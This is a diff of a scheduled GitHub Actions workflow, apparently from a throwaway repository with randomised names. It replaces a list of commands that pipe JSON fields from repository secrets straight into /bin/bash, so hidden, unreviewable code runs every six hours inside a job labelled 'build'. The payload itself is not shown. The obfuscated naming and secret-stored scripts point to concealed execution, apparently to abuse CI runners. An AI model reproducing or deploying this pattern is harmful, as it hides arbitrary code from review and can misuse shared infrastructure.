@@ -2,7 +2,7 @@ name: hehuchong1391
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
+    - cron: '34 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,23 +10,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: hehuchong1391
         env:
-          nu3448: ${{ secrets.nu3448 }}
+          pzn99: ${{ secrets.pzn99 }}
         run: |
-          echo $nu3448 | jq -r .ggdgk66 | /bin/bash
-          echo $gw33702 | jq -r .awtiw7086 | /bin/bash
-          echo $lcjno3288 | jq -r .bhacb55981 | /bin/bash
-          echo $vyhvh4 | jq -r .vodd153 | /bin/bash
-          echo $erh32 | jq -r .dect98 | /bin/bash
-          echo $x17998 | jq -r .r23 | /bin/bash
-          echo $r9529 | jq -r .sb4 | /bin/bash
-          echo $sfaac93 | jq -r .gylhh2484 | /bin/bash
-          echo $a521 | jq -r .rij0590 | /bin/bash
-          echo $yltsb354 | jq -r .aurn36 | /bin/bash
-          echo $tf055 | jq -r .fopna9368 | /bin/bash
-          echo $whn7 | jq -r .kw8902 | /bin/bash
-          echo $qdk5619 | jq -r .exkp977 | /bin/bash
-          echo $wxdrt304 | jq -r .qpvjf62 | /bin/bash
-          echo $eldhd22 | jq -r .nz6532 | /bin/bash
-          echo $le6988 | jq -r .qx31502 | /bin/bash
-          echo $ajcc5819 | jq -r .be044 | /bin/bash
+          echo $pzn99 | jq -r .xybc82070 | /bin/bash
+          echo $nryx94536 | jq -r .i54 | /bin/bash
+          echo $mpoad1 | jq -r .kv91989 | /bin/bash
+          echo $rf52736 | jq -r .gpb8 | /bin/bash
+          echo $j73 | jq -r .ekdg2 | /bin/bash
+          echo $q7020 | jq -r .l8 | /bin/bash
+          echo $pbw2 | jq -r .oys85068 | /bin/bash
+          echo $sy79377 | jq -r .tbxp7928 | /bin/bash
+          echo $kh4795 | jq -r .snly286 | /bin/bash
+          echo $av6 | jq -r .ug05752 | /bin/bash
 
